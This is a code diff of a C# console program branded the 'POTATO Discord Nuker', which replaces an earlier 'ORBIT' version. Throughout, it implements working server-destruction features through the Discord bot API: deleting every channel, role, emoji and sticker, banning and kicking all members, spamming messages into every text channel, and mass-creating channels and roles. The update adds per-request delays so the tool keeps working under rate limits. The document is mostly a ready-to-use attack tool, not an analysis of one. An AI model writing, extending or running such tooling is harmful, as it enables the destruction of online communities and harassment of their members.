@@ -3,25 +3,45 @@ Source Code:
 C# Console app
 
 ```
+// POTATO Discord Nuker
+// Made with ❤️ by bear
+
 using System;
 using System.Collections.Generic;
 using System.Net.Http;
-using System.Text.Json;
 using System.Text;
+using System.Text.Json;
 using System.Threading.Tasks;
 
 class Program
 {
-    private const string BotToken = ""; // Replace with your bot's token
-    private const string SecretKey = ""; // Access Key
-    private static string GuildId = ""; // Don't add anything nor remove.
+    private const string BotToken = ""; // Replace this with your bot token
+    private const string SecretKey = "POTATO"; // Access Code
+    private static string GuildId = ""; // Don't touch
 
     static async Task Main(string[] args)
     {
-        Console.Clear();
-        DisplayBigText("ORBIT", ConsoleColor.Cyan);
+        _ = Task.Run(async () =>
+        {
+            string[] titles = {
+                "POTATO Discord Nuker",
+                "Best Discord Nuker",
+                "Fast and Reliable"
+            };
+            int index = 0;
+            while (true)
+            {
+                Console.Title = titles[index++ % titles.Length];
+                await Task.Delay(2000);
+            }
+        });
 
-        Console.Write("\nEnter the access key: ");
+        Console.Clear();
+        DisplayAsciiArt("POTATO", ConsoleColor.Cyan);
+
+        string prompt = "Enter the access key: ";
+        Console.SetCursorPosition((Console.WindowWidth - prompt.Length) / 2, Console.WindowHeight / 2);
+        Console.Write(prompt);
         string accessKey = Console.ReadLine();
 
         if (accessKey != SecretKey)
@@ -36,67 +56,48 @@ class Program
         while (true)
         {
             Console.Clear();
-            string[] menu = new string[]
-            {
-                $"Current Server ID: {(string.IsNullOrEmpty(GuildId) ? "Not Set" : GuildId)}",
-                "1. Set Server (Guild) ID",
-                "2. Create Channels",
-                "3. Delete All Channels",
-                "4. Spam Message to All Text Channels",
-                "5. Ban All Members",
-                "6. Kick All Members",
-                "7. Exit"
-            };
+            DisplayAsciiArt("POTATO", ConsoleColor.Cyan);
 
-            int centerX = Console.WindowWidth / 2;
-            int centerY = Console.WindowHeight / 2 - 3;
-
-            foreach (var line in menu)
+            string[] menu = new[]
             {
-                Console.SetCursorPosition(centerX - line.Length / 2, centerY++);
-                Console.WriteLine(line.ColorText(ConsoleColor.Green));
+    "═══════════════════════════════════════════════════════════════════════════════════════",
+    "                                POTATO NUKER || BY BEAR                               ",
+    "═══════════════════════════════════════════════════════════════════════════════════════",
+    "",
+    "(01) Set Guild ID          (02) Create Channels       (03) Delete Channels       ",
+    "(04) Spam Text             (05) Ban All Members       (06) Kick All Members      ",
+    "(07) Delete Stickers       (08) Delete Emojis         (09) Delete Roles          ",
+   "(10) Mass Create Roles                                (11) Exit                  "
+};
+
+            int startY = Console.WindowHeight / 2 - menu.Length / 2;
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            foreach (string line in menu)
+            {
+                Console.SetCursorPosition((Console.WindowWidth - line.Length) / 2, startY++);
+                Console.WriteLine(line);
             }
+            Console.ResetColor();
 
-            Console.SetCursorPosition(centerX - 10, centerY);
-            Console.Write("Enter your choice: ");
+            string optPrompt = "(Potato) Option: ";
+            Console.SetCursorPosition((Console.WindowWidth - optPrompt.Length) / 2, startY + 1);
+            Console.Write(optPrompt);
             string choice = Console.ReadLine();
 
             switch (choice)
             {
-                case "1":
-                    Console.Write("Enter Server (Guild) ID: ");
-                    GuildId = Console.ReadLine();
-                    Console.WriteLine("[+] Server ID set!".ColorText(ConsoleColor.Cyan));
-                    await Task.Delay(1500);
-                    break;
-
-                case "2":
-                    if (CheckGuildId()) await CreateChannels(httpClient);
-                    break;
-
-                case "3":
-                    if (CheckGuildId()) await DeleteAllChannels(httpClient);
-                    break;
-
-                case "4":
-                    if (CheckGuildId()) await SpamMessageToAllTextChannels(httpClient);
-                    break;
-
-                case "5":
-                    if (CheckGuildId()) await BanAllMembers(httpClient);
-                    break;
-
-                case "6":
-                    if (CheckGuildId()) await KickAllMembers(httpClient);
-                    break;
-
-                case "7":
-                    Console.WriteLine("[+] Exiting program.".ColorText(ConsoleColor.Green));
-                    return;
-
-                default:
-                    Console.WriteLine("[-] Invalid choice.".ColorText(ConsoleColor.Red));
-                    break;
+                case "1": Console.Write("Enter Guild ID: "); GuildId = Console.ReadLine(); break;
+                case "2": if (CheckGuildId()) await CreateChannels(httpClient); break;
+                case "3": if (CheckGuildId()) await DeleteAllChannels(httpClient); break;
+                case "4": if (CheckGuildId()) await SpamMessageToAllTextChannels(httpClient); break;
+                case "5": if (CheckGuildId()) await BanAllMembers(httpClient); break;
+                case "6": if (CheckGuildId()) await KickAllMembers(httpClient); break;
+                case "7": if (CheckGuildId()) await DeleteAllStickers(httpClient); break;
+                case "8": if (CheckGuildId()) await DeleteAllEmojis(httpClient); break;
+                case "9": if (CheckGuildId()) await DeleteAllRoles(httpClient); break;
+                case "10": if (CheckGuildId()) await MassCreateRoles(httpClient); break;
+                case "11": return;
+                default: Console.WriteLine("[-] Invalid choice.".ColorText(ConsoleColor.Red)); break;
             }
 
             Console.WriteLine("\nPress Enter to continue...");
@@ -108,156 +109,203 @@ class Program
     {
         if (string.IsNullOrEmpty(GuildId))
         {
-            Console.WriteLine("[-] Please set the Server ID first (Option 1).".ColorText(ConsoleColor.Red));
+            Console.WriteLine("[-] Please set the Server ID first.".ColorText(ConsoleColor.Red));
             return false;
         }
         return true;
     }
 
-    private static void DisplayBigText(string text, ConsoleColor color)
+    private static void DisplayAsciiArt(string title, ConsoleColor color)
     {
-        string[] bigText = new string[]
+        string[] ascii = new[]
         {
-            " OOO   RRRR   BBBB   III  TTTTT ",
-            "O   O  R   R  B   B   I     T   ",
-            "O   O  RRRR   BBBB    I     T   ",
-            "O   O  R  R   B   B   I     T   ",
-            " OOO   R   R  BBBB   III    T   "
+            @"██████╗  ██████╗ ████████╗ █████╗ ████████╗ ██████╗ ",
+            @"██╔══██╗██╔═══██╗╚══██╔══╝██╔══██╗╚══██╔══╝██╔═══██╗",
+            @"██████╔╝██║   ██║   ██║   ███████║   ██║   ██║   ██║",
+            @"██╔═══╝ ██║   ██║   ██║   ██╔══██║   ██║   ██║   ██║",
+            @"██║     ╚██████╔╝   ██║   ██║  ██║   ██║   ╚██████╔╝",
+            @"╚═╝      ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ "
         };
 
+        int top = 2;
         Console.ForegroundColor = color;
-        foreach (var line in bigText) Console.WriteLine(line);
+        foreach (string line in ascii)
+        {
+            Console.SetCursorPosition((Console.WindowWidth - line.Length) / 2, top++);
+            Console.WriteLine(line);
+        }
         Console.ResetColor();
     }
 
     private static async Task CreateChannels(HttpClient httpClient)
     {
         Console.Write("How many channels to create? ");
-        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0)
-        {
-            Console.WriteLine("[-] Invalid number.".ColorText(ConsoleColor.Red));
-            return;
-        }
+        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;
 
-        Console.Write("Enter the base name for the channels: ");
+        Console.Write("Enter base name for the channels: ");
         string name = Console.ReadLine();
 
-        var tasks = new List<Task>();
         for (int i = 1; i <= count; i++)
         {
             var payload = new { name = $"{name}-{i}", type = 0 };
             var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
-            tasks.Add(httpClient.PostAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels", content));
+            await httpClient.PostAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels", content);
+            await Task.Delay(100);
         }
-
-        await Task.WhenAll(tasks);
         Console.WriteLine("[+] Channels created!".ColorText(ConsoleColor.Green));
     }
 
     private static async Task DeleteAllChannels(HttpClient httpClient)
     {
         Console.Write("Are you sure you want to delete ALL channels? (y/n): ");
-        if (Console.ReadLine()?.ToLower() != "y")
-        {
-            Console.WriteLine("[-] Cancelled.".ColorText(ConsoleColor.Red));
-            return;
-        }
+        if (Console.ReadLine()?.ToLower() != "y") return;
 
-        var response = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
-        var json = await response.Content.ReadAsStringAsync();
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
+        var json = await res.Content.ReadAsStringAsync();
         var channels = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();
 
-        var tasks = new List<Task>();
-        foreach (var channel in channels)
+        foreach (var ch in channels)
         {
-            string id = channel.GetProperty("id").GetString();
-            tasks.Add(httpClient.DeleteAsync($"https://discord.com/api/v10/channels/{id}"));
+            string id = ch.GetProperty("id").GetString();
+            await httpClient.DeleteAsync($"https://discord.com/api/v10/channels/{id}");
+            await Task.Delay(100);
         }
 
-        await Task.WhenAll(tasks);
-        Console.WriteLine("[+] Channels deleted!".ColorText(ConsoleColor.Green));
+        Console.WriteLine("[+] All channels deleted.".ColorText(ConsoleColor.Green));
     }
 
     private static async Task SpamMessageToAllTextChannels(HttpClient httpClient)
     {
         Console.Write("Enter the message to spam: ");
-        string message = Console.ReadLine();
+        string msg = Console.ReadLine();
 
         Console.Write("How many times per channel? ");
-        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0)
-        {
-            Console.WriteLine("[-] Invalid number.".ColorText(ConsoleColor.Red));
-            return;
-        }
+        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;
 
-        var response = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
-        var json = await response.Content.ReadAsStringAsync();
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/channels");
+        var json = await res.Content.ReadAsStringAsync();
         var channels = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();
 
-        var textChannels = new List<string>();
         foreach (var ch in channels)
-            if (ch.GetProperty("type").GetInt32() == 0)
-                textChannels.Add(ch.GetProperty("id").GetString());
-
-        var tasks = new List<Task>();
-        foreach (var ch in textChannels)
         {
+            if (ch.GetProperty("type").GetInt32() != 0) continue;
+            string id = ch.GetProperty("id").GetString();
             for (int i = 0; i < count; i++)
             {
-                var payload = new { content = message };
+                var payload = new { content = msg };
                 var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
-                tasks.Add(httpClient.PostAsync($"https://discord.com/api/v10/channels/{ch}/messages", content));
+                await httpClient.PostAsync($"https://discord.com/api/v10/channels/{id}/messages", content);
+                await Task.Delay(250);
             }
         }
 
-        await Task.WhenAll(tasks);
-        Console.WriteLine($"[+] Spammed {count}x per text channel.".ColorText(ConsoleColor.Green));
+        Console.WriteLine("[+] Spam complete.".ColorText(ConsoleColor.Green));
     }
 
     private static async Task BanAllMembers(HttpClient httpClient)
     {
-        var response = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
-        if (!response.IsSuccessStatusCode)
-        {
-            Console.WriteLine("[-] Failed to get members.".ColorText(ConsoleColor.Red));
-            return;
-        }
-
-        string json = await response.Content.ReadAsStringAsync();
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
+        var json = await res.Content.ReadAsStringAsync();
         var members = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();
 
-        var tasks = new List<Task>();
-        foreach (var member in members)
+        foreach (var m in members)
         {
-            string userId = member.GetProperty("user").GetProperty("id").GetString();
-            tasks.Add(httpClient.PutAsync($"https://discord.com/api/v10/guilds/{GuildId}/bans/{userId}", null));
+            string id = m.GetProperty("user").GetProperty("id").GetString();
+            await httpClient.PutAsync($"https://discord.com/api/v10/guilds/{GuildId}/bans/{id}", null);
+            await Task.Delay(100);
         }
 
-        await Task.WhenAll(tasks);
         Console.WriteLine("[+] All members banned.".ColorText(ConsoleColor.Green));
     }
 
     private static async Task KickAllMembers(HttpClient httpClient)
     {
-        var response = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
-        if (!response.IsSuccessStatusCode)
-        {
-            Console.WriteLine("[-] Failed to get members.".ColorText(ConsoleColor.Red));
-            return;
-        }
-
-        string json = await response.Content.ReadAsStringAsync();
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/members?limit=1000");
+        var json = await res.Content.ReadAsStringAsync();
         var members = JsonSerializer.Deserialize<JsonElement>(json).EnumerateArray();
 
-        var tasks = new List<Task>();
-        foreach (var member in members)
+        foreach (var m in members)
         {
-            string userId = member.GetProperty("user").GetProperty("id").GetString();
-            tasks.Add(httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/members/{userId}"));
+            string id = m.GetProperty("user").GetProperty("id").GetString();
+            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/members/{id}");
+            await Task.Delay(100);
         }
 
-        await Task.WhenAll(tasks);
         Console.WriteLine("[+] All members kicked.".ColorText(ConsoleColor.Green));
+    }
+
+    private static async Task DeleteAllStickers(HttpClient httpClient)
+    {
+        Console.Write("Are you sure you want to delete all stickers? (y/n): ");
+        if (Console.ReadLine()?.ToLower() != "y") return;
+
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/stickers");
+        var data = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());
+
+        foreach (var s in data.EnumerateArray())
+        {
+            string id = s.GetProperty("id").GetString();
+            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/stickers/{id}");
+            await Task.Delay(100);
+        }
+
+        Console.WriteLine("[+] All stickers deleted.".ColorText(ConsoleColor.Green));
+    }
+
+    private static async Task DeleteAllEmojis(HttpClient httpClient)
+    {
+        Console.Write("Are you sure you want to delete all emojis? (y/n): ");
+        if (Console.ReadLine()?.ToLower() != "y") return;
+
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/emojis");
+        var data = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());
+
+        foreach (var emoji in data.EnumerateArray())
+        {
+            string id = emoji.GetProperty("id").GetString();
+            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/emojis/{id}");
+            await Task.Delay(100);
+        }
+
+        Console.WriteLine("[+] All emojis deleted.".ColorText(ConsoleColor.Green));
+    }
+
+    private static async Task DeleteAllRoles(HttpClient httpClient)
+    {
+        Console.Write("Are you sure you want to delete all roles? (y/n): ");
+        if (Console.ReadLine()?.ToLower() != "y") return;
+
+        var res = await httpClient.GetAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles");
+        var roles = JsonSerializer.Deserialize<JsonElement>(await res.Content.ReadAsStringAsync());
+
+        foreach (var role in roles.EnumerateArray())
+        {
+            string id = role.GetProperty("id").GetString();
+            if (role.GetProperty("managed").GetBoolean()) continue;
+            await httpClient.DeleteAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles/{id}");
+            await Task.Delay(100);
+        }
+
+        Console.WriteLine("[+] All roles deleted.".ColorText(ConsoleColor.Green));
+    }
+
+    private static async Task MassCreateRoles(HttpClient httpClient)
+    {
+        Console.Write("Enter role name: ");
+        string roleName = Console.ReadLine();
+
+        Console.Write("How many roles to create? ");
+        if (!int.TryParse(Console.ReadLine(), out int count) || count <= 0) return;
+
+        for (int i = 1; i <= count; i++)
+        {
+            var payload = new { name = $"{roleName}-{i}" };
+            var content = new StringContent(JsonSerializer.Serialize(payload), Encoding.UTF8, "application/json");
+            await httpClient.PostAsync($"https://discord.com/api/v10/guilds/{GuildId}/roles", content);
+            await Task.Delay(100);
+        }
+
+        Console.WriteLine("[+] Roles created.".ColorText(ConsoleColor.Green));
     }
 }
 
